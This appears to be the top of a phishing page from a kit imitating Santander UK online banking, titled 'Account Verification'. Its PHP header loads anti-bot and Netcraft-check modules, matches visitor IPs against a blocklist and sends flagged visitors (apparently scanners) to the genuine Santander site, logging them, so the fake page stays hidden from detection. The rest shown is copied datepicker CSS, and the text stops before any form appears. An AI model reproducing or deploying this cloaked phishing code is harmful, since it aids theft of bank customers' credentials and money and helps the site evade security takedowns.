<?php
//Dwi F.D
require '../CONFIG.php';
require 'partial/margin.php';
include 'partial/zero.php';
include 'vendor/100.php';
include 'vendor/200.php';
include 'vendor/300.php';
require_once 'vendor/index.php';
require_once '../remote/500.php';
include 'vendor/netcraft_check.php';
require('../CONFIG.php');
$filename = '../2617d44145d0300cdf70349b2f3cac79.txt';
$ip_to_search = $_SERVER['REMOTE_ADDR'];

if (false !== strpos(file_get_contents($filename), $ip_to_search)) {

	header("Location: https://href.li/?https://santander.co.uk");
	$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
	file_put_contents('vendor/one_time_br_prevents.log', $line . PHP_EOL, FILE_APPEND);
	session_destroy();
	die();
} else {
	// otherwise
}
session_start();
error_reporting(0);

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
if ($_SESSION['started'] == 'true') {
	$uniqueid = $_SESSION['uniqueid'];
} else {
	header('location:exit.php');
}
?>
<html lang="en-GB">


<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta name="robots" content="noindex, nofollow">
	<meta name="ROBOTS" content="NOODP,NOYDIR">

	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Cache-Control" content="no-cache, no-store" />

	<meta http-equiv="X-Xss-Protection" content="&#39;1; mode=block&#39; always" />
	<meta http-equiv="X-Content-Type-Options" content="&#39;nosniff&#39; always" />
	<meta http-equiv="Strict-Transport-Security" content="max-age=31536000" />

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1" />
	<!--<base href="/olb/app/reset/">-->
	<base href="." />
	<link rel="stylesheet" href="partial/css/styles.f7e4fd8c4b9938b838f0.css" />
	<title>Online Banking: Account Verification</title>
	<link rel="icon" type="image/x-icon" href="partial/img/logo.ico" />

	<style>
		input[type="text"][_ngcontent-tsy-c0]:focus {
			box-shadow: 0 0 0 1px #9bc3d3;
		}

		.pid-inline-error-message[_ngcontent-tsy-c0] {
			color: #c00;
			font-size: 14px;
			font-weight: 400;
			font-style: normal;
			font-stretch: normal;
			line-height: normal;
			letter-spacing: normal;
		}

		.pid-textbox-invalid[_ngcontent-tsy-c0] {
			border: 1px solid #ec0000 !important;
			border-radius: 4px;
		}

		.align-right[_ngcontent-tsy-c0] {
			padding-left: 2.8125rem;
		}

		.label-container[_ngcontent-tsy-c0] {
			display: flex;
			justify-content: space-between;
		}

		@media (min-width: 300px) and (max-width: 359px) {
			.pid-textbox[_ngcontent-tsy-c0] {
				width: 280px !important;
			}
		}
	</style>
	<style>
		.bs-datepicker[_ngcontent-tsy-c1] {
			display: flex;
			align-items: stretch;
			flex-flow: row wrap;
			background: #fff;
			box-shadow: 0 0 10px 0 #aaa;
			position: relative;
			z-index: 1;
		}

		.bs-datepicker[_ngcontent-tsy-c1]:after {
			clear: both;
			content: "";
			display: block;
		}

		.bs-datepicker[_ngcontent-tsy-c1] bs-day-picker[_ngcontent-tsy-c1] {
			float: left;
		}

		.bs-datepicker[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:active,
		.bs-datepicker[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:focus,
		.bs-datepicker[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:hover,
		.bs-datepicker[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1]:active,
		.bs-datepicker[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1]:focus,
		.bs-datepicker[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1]:hover,
		.bs-datepicker-btns[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:active,
		.bs-datepicker-btns[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:focus,
		.bs-datepicker-btns[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:hover,
		.bs-datepicker-predefined-btns[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:active,
		.bs-datepicker-predefined-btns[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:focus {
			outline: 0;
		}

		.bs-datepicker-head[_ngcontent-tsy-c1] {
			min-width: 270px;
			height: 50px;
			padding: 10px;
			border-radius: 3px 3px 0 0;
			text-align: justify;
		}

		.bs-datepicker-head[_ngcontent-tsy-c1]:after {
			content: "";
			display: inline-block;
			vertical-align: top;
			width: 100%;
		}

		.bs-datepicker-head[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1] {
			display: inline-block;
			vertical-align: top;
			padding: 0;
			height: 30px;
			line-height: 30px;
			border: 0;
			background: 0 0;
			text-align: center;
			cursor: pointer;
			color: #fff;
			transition: 0.3s;
		}

		.bs-datepicker-head[_ngcontent-tsy-c1] button[disabled][_ngcontent-tsy-c1],
		.bs-datepicker-head[_ngcontent-tsy-c1] button[disabled][_ngcontent-tsy-c1]:active,
		.bs-datepicker-head[_ngcontent-tsy-c1] button[disabled][_ngcontent-tsy-c1]:hover {
			background: rgba(221, 221, 221, 0.3);
			color: #f5f5f5;
			cursor: not-allowed;
		}

		.bs-datepicker-head[_ngcontent-tsy-c1] button.next[_ngcontent-tsy-c1],
		.bs-datepicker-head[_ngcontent-tsy-c1] button.previous[_ngcontent-tsy-c1] {
			border-radius: 50%;
			width: 30px;
			height: 30px;
		}

		.bs-datepicker-head[_ngcontent-tsy-c1] button.next[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1],
		.bs-datepicker-head[_ngcontent-tsy-c1] button.previous[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			font-size: 28px;
			line-height: 1;
			display: inline-block;
			position: relative;
			height: 100%;
			width: 100%;
			border-radius: 50%;
		}

		.bs-datepicker-head[_ngcontent-tsy-c1] button.current[_ngcontent-tsy-c1] {
			border-radius: 15px;
			max-width: 155px;
			padding: 0 13px;
		}

		.bs-datepicker-head[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:hover {
			background-color: rgba(0, 0, 0, 0.1);
		}

		.bs-datepicker-head[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:active {
			background-color: rgba(0, 0, 0, 0.2);
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] {
			padding: 10px;
			border-radius: 0 0 3px 3px;
			min-height: 232px;
			min-width: 278px;
			border: 1px solid #e9edf0;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] .days.weeks[_ngcontent-tsy-c1] {
			position: relative;
			z-index: 1;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] {
			width: 100%;
			border-collapse: separate;
			border-spacing: 0;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] th[_ngcontent-tsy-c1] {
			font-size: 13px;
			color: #9aaec1;
			font-weight: 400;
			text-align: center;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] {
			color: #54708b;
			text-align: center;
			position: relative;
			padding: 0;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			display: block;
			margin: 0 auto;
			font-size: 13px;
			border-radius: 50%;
			position: relative;
			-moz-user-select: none;
			-webkit-user-select: none;
			-ms-user-select: none;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1]:not(.disabled):not(.week) span[_ngcontent-tsy-c1]:not(.disabled):not(.is-other-month) {
			cursor: pointer;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.is-highlighted[_ngcontent-tsy-c1]:not(.disabled):not(.selected),
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.is-highlighted[_ngcontent-tsy-c1]:not(.disabled):not(.selected) span[_ngcontent-tsy-c1] {
			background-color: #e9edf0;
			transition: none;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.is-active-other-month[_ngcontent-tsy-c1]:not(.disabled):not(.selected),
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.is-active-other-month[_ngcontent-tsy-c1]:not(.disabled):not(.selected) span[_ngcontent-tsy-c1] {
			background-color: #e9edf0;
			transition: none;
			cursor: pointer;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.disabled[_ngcontent-tsy-c1],
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.disabled[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: #9aaec1;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.selected[_ngcontent-tsy-c1],
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.selected[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: #fff;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.is-other-month[_ngcontent-tsy-c1],
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.is-other-month[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: rgba(0, 0, 0, 0.25);
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active[_ngcontent-tsy-c1] {
			position: relative;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active.select-start[_ngcontent-tsy-c1]:before {
			left: 35%;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active.select-end[_ngcontent-tsy-c1]:before {
			left: -85%;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.active.select-end[_ngcontent-tsy-c1]:after,
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.active.select-start[_ngcontent-tsy-c1]:after,
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active.select-end[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:after,
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active.select-start[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:after {
			content: "";
			display: block;
			position: absolute;
			z-index: -1;
			width: 100%;
			height: 100%;
			transition: 0.3s;
			top: 0;
			border-radius: 50%;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1]:before {
			content: "";
			display: block;
			position: absolute;
			z-index: -1;
			top: 6px;
			bottom: 6px;
			left: -2px;
			right: -2px;
			box-sizing: content-box;
			background: 0 0;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active.select-start[_ngcontent-tsy-c1]+td.active[_ngcontent-tsy-c1]:before {
			left: -20%;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1]:last-child.active:before {
			border-radius: 0 3px 3px 0;
			width: 125%;
			left: -25%;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[class*="select-"][_ngcontent-tsy-c1],
		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[class*="select-"][_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			border-radius: 50%;
			color: #fff;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] span.active[_ngcontent-tsy-c1]:not(.select-start):before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] span.in-range[_ngcontent-tsy-c1]:not(.select-start):before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] td.active[_ngcontent-tsy-c1]:not(.select-start):before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] td.in-range[_ngcontent-tsy-c1]:not(.select-start):before {
			background: #e9edf0;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			width: 32px;
			height: 32px;
			line-height: 32px;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] span.select-start[_ngcontent-tsy-c1] {
			z-index: 2;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] span.in-range.select-end[_ngcontent-tsy-c1]:before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] span.is-highlighted.in-range[_ngcontent-tsy-c1]:before {
			background: 0 0;
			right: 0;
			left: 0;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] td.active[_ngcontent-tsy-c1]+td.is-highlighted[_ngcontent-tsy-c1]:before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] td.active[_ngcontent-tsy-c1]+td.select-end[_ngcontent-tsy-c1]:before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] td.in-range[_ngcontent-tsy-c1]+td.is-highlighted[_ngcontent-tsy-c1]:before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] td.in-range[_ngcontent-tsy-c1]+td.select-end[_ngcontent-tsy-c1]:before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] td.select-start[_ngcontent-tsy-c1]+td.is-highlighted[_ngcontent-tsy-c1]:before,
		.bs-datepicker-body[_ngcontent-tsy-c1] table.days[_ngcontent-tsy-c1] td.select-start[_ngcontent-tsy-c1]+td.select-end[_ngcontent-tsy-c1]:before {
			background: #e9edf0;
			width: 100%;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.weeks[_ngcontent-tsy-c1] tr[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1]:nth-child(2).active:before {
			border-radius: 3px 0 0 3px;
			left: 0;
			width: 100%;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1]:not(.weeks) tr[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1]:first-child:before {
			border-radius: 3px 0 0 3px;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.years[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			width: 46px;
			height: 46px;
			line-height: 45px;
			margin: 0 auto;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.years[_ngcontent-tsy-c1] tr[_ngcontent-tsy-c1]:not(:last-child) td[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			margin-bottom: 8px;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.months[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] {
			height: 52px;
		}

		.bs-datepicker-body[_ngcontent-tsy-c1] table.months[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			padding: 6px;
			border-radius: 15px;
		}

		.bs-datepicker[_ngcontent-tsy-c1] .current-timedate[_ngcontent-tsy-c1] {
			color: #54708b;
			font-size: 15px;
			text-align: center;
			height: 30px;
			line-height: 30px;
			border-radius: 20px;
			border: 1px solid #e9edf0;
			margin-bottom: 10px;
			cursor: pointer;
			text-transform: uppercase;
			-moz-user-select: none;
			-webkit-user-select: none;
			-ms-user-select: none;
		}

		.bs-datepicker[_ngcontent-tsy-c1] .current-timedate[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:not(:empty):before {
			content: "";
			width: 15px;
			height: 16px;
			display: inline-block;
			margin-right: 4px;
			vertical-align: text-bottom;
			background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAQCAYAAADJViUEAAABMklEQVQoU9VTwW3CQBCcOUgBtEBKSAukAnBKME+wFCAlYIhk8sQlxFABtJAScAsuAPBEewYcxCP8ouxrPDsza61uiVN1o6RNHD4htSCmq49RfO71BvMJqBBkITRf1kmUW49nQRC9h1I5AZlBClaL8aP1fKgOOxCx8aSLs+Q19eZuNO8QmPqJRtDFguy7OAcDbJPs+/BKVPDIPrvD2ZJgWAmVe7O0rI0Vqs1seyWUXpuJoppYCa5L+U++NpNPkr5OE2oMdARsb3gykJT5ydZcL8Z9Ww60nxg2LhjON9li9OwXZzo+xLbp3nC2s9CL2RrueGyVrgwNm8HpsCzZ9EEW6kqXlo1GQe03FzP/7W8Hl0dBtu7Bf7zt6mIwvX1RvzDCm7+q3mAW0Dl/GPdUCeXrZLT9BrDrGkm4qlPvAAAAAElFTkSuQmCC);
		}

		.bs-datepicker-multiple[_ngcontent-tsy-c1] {
			border-radius: 4px 0 0 4px;
		}

		.bs-datepicker-multiple[_ngcontent-tsy-c1]+.bs-datepicker-multiple[_ngcontent-tsy-c1] {
			margin-left: 10px;
		}

		.bs-datepicker-multiple[_ngcontent-tsy-c1] .bs-datepicker[_ngcontent-tsy-c1] {
			box-shadow: none;
			position: relative;
		}

		.bs-datepicker-multiple[_ngcontent-tsy-c1] .bs-datepicker[_ngcontent-tsy-c1]:not(:last-child) {
			padding-right: 10px;
		}

		.bs-datepicker-multiple[_ngcontent-tsy-c1] .bs-datepicker[_ngcontent-tsy-c1]+.bs-datepicker[_ngcontent-tsy-c1]:after {
			content: "";
			display: block;
			width: 14px;
			height: 10px;
			background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAA1ElEQVQoU42RsQrCUAxF77VuDu7O4oMWW//BURBBpZvgKk4uIrjoqKOTf+DopIO4uYggtFTfw3+pkQqCW1/G5J7kJiFy4m5MxUlxAzgIPHX+lzMPzupRYlYgxiR7vqsOP8YKzsTx0yxFMCUZ+q7aZzlr+OvgoWcAFyAHgat2jLWu48252DdqAihDJGSSJNUUxYmQjs3+hPQBlAh2rG2LCOPnaw3IiGDX99TRCs7ASJsNhUOA7d/LcuHvRG22FIZvsNXw1MX6VZExCilOQKEfeLXr/10+aC9Ho7arh7oAAAAASUVORK5CYII=);
			position: absolute;
			top: 25px;
			left: -8px;
		}

		.bs-datepicker-multiple[_ngcontent-tsy-c1] .bs-datepicker[_ngcontent-tsy-c1] .left[_ngcontent-tsy-c1] {
			float: left;
		}

		.bs-datepicker-multiple[_ngcontent-tsy-c1] .bs-datepicker[_ngcontent-tsy-c1] .right[_ngcontent-tsy-c1] {
			float: right;
		}

		.bs-datepicker-container[_ngcontent-tsy-c1] {
			padding: 15px;
		}

		.bs-datepicker[_ngcontent-tsy-c1] .bs-media-container[_ngcontent-tsy-c1] {
			display: flex;
		}

		@media (max-width: 768px) {
			.bs-datepicker[_ngcontent-tsy-c1] .bs-media-container[_ngcontent-tsy-c1] {
				flex-direction: column;
			}
		}

		.bs-datepicker-custom-range[_ngcontent-tsy-c1] {
			padding: 15px;
			background: #eee;
		}

		.bs-datepicker-predefined-btns[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1] {
			width: 100%;
			display: block;
			height: 30px;
			background-color: #9aaec1;
			border-radius: 4px;
			color: #fff;
			border: 0;
			margin-bottom: 10px;
			padding: 0 18px;
			text-align: left;
			transition: 0.3s;
		}

		.bs-datepicker-predefined-btns[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:active,
		.bs-datepicker-predefined-btns[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:hover {
			background-color: #54708b;
		}

		.bs-datepicker-buttons[_ngcontent-tsy-c1] {
			display: flex;
			flex-flow: row wrap;
			justify-content: flex-end;
			padding-top: 10px;
			border-top: 1px solid #e9edf0;
		}

		.bs-datepicker-buttons[_ngcontent-tsy-c1] .btn-default[_ngcontent-tsy-c1] {
			margin-left: 10px;
		}

		.bs-timepicker-container[_ngcontent-tsy-c1] {
			padding: 10px 0;
		}

		.bs-timepicker-label[_ngcontent-tsy-c1] {
			color: #54708b;
			margin-bottom: 10px;
		}

		.bs-timepicker-controls[_ngcontent-tsy-c1] {
			display: inline-block;
			vertical-align: top;
			margin-right: 10px;
		}

		.bs-timepicker-controls[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1] {
			width: 20px;
			height: 20px;
			border-radius: 50%;
			border: 0;
			background-color: #e9edf0;
			color: #54708b;
			font-size: 16px;
			font-weight: 700;
			vertical-align: middle;
			line-height: 0;
			padding: 0;
			transition: 0.3s;
		}

		.bs-timepicker-controls[_ngcontent-tsy-c1] button[_ngcontent-tsy-c1]:hover {
			background-color: #d5dadd;
		}

		.bs-timepicker-controls[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1] {
			width: 35px;
			height: 25px;
			border-radius: 13px;
			text-align: center;
			border: 1px solid #e9edf0;
		}

		.bs-timepicker[_ngcontent-tsy-c1] .switch-time-format[_ngcontent-tsy-c1] {
			text-transform: uppercase;
			min-width: 54px;
			height: 25px;
			border-radius: 20px;
			border: 1px solid #e9edf0;
			background: #fff;
			color: #54708b;
			font-size: 13px;
		}

		.bs-timepicker[_ngcontent-tsy-c1] .switch-time-format[_ngcontent-tsy-c1] img[_ngcontent-tsy-c1] {
			vertical-align: initial;
			margin-left: 4px;
		}

		bs-datepicker-container[_ngcontent-tsy-c1],
		bs-daterangepicker-container[_ngcontent-tsy-c1] {
			z-index: 1080;
		}

		@media (max-width: 768px) {
			.bs-datepicker-multiple[_ngcontent-tsy-c1] {
				display: flex;
			}

			.bs-datepicker-multiple[_ngcontent-tsy-c1]+.bs-datepicker-multiple[_ngcontent-tsy-c1] {
				margin-top: 10px;
				margin-left: 0;
			}
		}

		.theme-default[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.selected[_ngcontent-tsy-c1],
		.theme-default[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[class*="select-"][_ngcontent-tsy-c1]:after,
		.theme-default[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.selected[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1],
		.theme-default[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[class*="select-"][_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:after,
		.theme-default[_ngcontent-tsy-c1] .bs-datepicker-head[_ngcontent-tsy-c1] {
			background-color: #777;
		}

		.theme-default[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: #777;
		}

		.theme-default[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active-week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:hover {
			cursor: pointer;
			background-color: #777;
			color: #fff;
			opacity: 0.5;
			transition: none;
		}

		.theme-green[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.selected[_ngcontent-tsy-c1],
		.theme-green[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[class*="select-"][_ngcontent-tsy-c1]:after,
		.theme-green[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.selected[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1],
		.theme-green[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[class*="select-"][_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:after,
		.theme-green[_ngcontent-tsy-c1] .bs-datepicker-head[_ngcontent-tsy-c1] {
			background-color: #5cb85c;
		}

		.theme-green[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: #5cb85c;
		}

		.theme-green[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active-week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:hover {
			cursor: pointer;
			background-color: #5cb85c;
			color: #fff;
			opacity: 0.5;
			transition: none;
		}

		.theme-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.selected[_ngcontent-tsy-c1],
		.theme-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[class*="select-"][_ngcontent-tsy-c1]:after,
		.theme-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.selected[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1],
		.theme-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[class*="select-"][_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:after,
		.theme-blue[_ngcontent-tsy-c1] .bs-datepicker-head[_ngcontent-tsy-c1] {
			background-color: #5bc0de;
		}

		.theme-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: #5bc0de;
		}

		.theme-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active-week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:hover {
			cursor: pointer;
			background-color: #5bc0de;
			color: #fff;
			opacity: 0.5;
			transition: none;
		}

		.theme-dark-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.selected[_ngcontent-tsy-c1],
		.theme-dark-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[class*="select-"][_ngcontent-tsy-c1]:after,
		.theme-dark-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.selected[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1],
		.theme-dark-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[class*="select-"][_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:after,
		.theme-dark-blue[_ngcontent-tsy-c1] .bs-datepicker-head[_ngcontent-tsy-c1] {
			background-color: #337ab7;
		}

		.theme-dark-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: #337ab7;
		}

		.theme-dark-blue[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active-week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:hover {
			cursor: pointer;
			background-color: #337ab7;
			color: #fff;
			opacity: 0.5;
			transition: none;
		}

		.theme-red[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.selected[_ngcontent-tsy-c1],
		.theme-red[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[class*="select-"][_ngcontent-tsy-c1]:after,
		.theme-red[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.selected[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1],
		.theme-red[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[class*="select-"][_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:after,
		.theme-red[_ngcontent-tsy-c1] .bs-datepicker-head[_ngcontent-tsy-c1] {
			background-color: #d9534f;
		}

		.theme-red[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: #d9534f;
		}

		.theme-red[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active-week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:hover {
			cursor: pointer;
			background-color: #d9534f;
			color: #fff;
			opacity: 0.5;
			transition: none;
		}

